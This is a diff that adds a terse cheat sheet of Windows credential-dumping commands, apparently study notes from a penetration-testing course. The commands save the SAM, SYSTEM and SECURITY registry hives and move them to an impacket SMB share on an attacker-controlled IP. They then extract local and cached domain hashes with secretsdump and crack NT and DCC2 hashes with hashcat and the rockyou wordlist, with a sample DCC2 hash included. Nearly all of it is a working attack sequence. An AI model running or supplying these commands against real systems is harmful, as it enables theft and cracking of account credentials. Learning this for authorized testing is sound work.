@@ -1,0 +1,38 @@
+reg.exe save hklm\sam C:\sam.save                   sam           local account hashes
+reg.exe save hklm\system C:\system.save             bootkey       to decrypt sam and security (always needed)
+reg.exe save hklm\security C:\security.save         lsa           dcc2, dpapi and more
+
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
+
+move sam.save \\10.10.15.16\CompData
+move security.save \\10.10.15.16\CompData
+move system.save \\10.10.15.16\CompData
+
+!!!!!!!!!!BEFORE CONTINUEING MAKE A COPY OF THE HIVES!!!!!!!!!!
+locate secretsdump
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+copy nt hashes to list
+
+sudo hashcat -m 1000 list.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
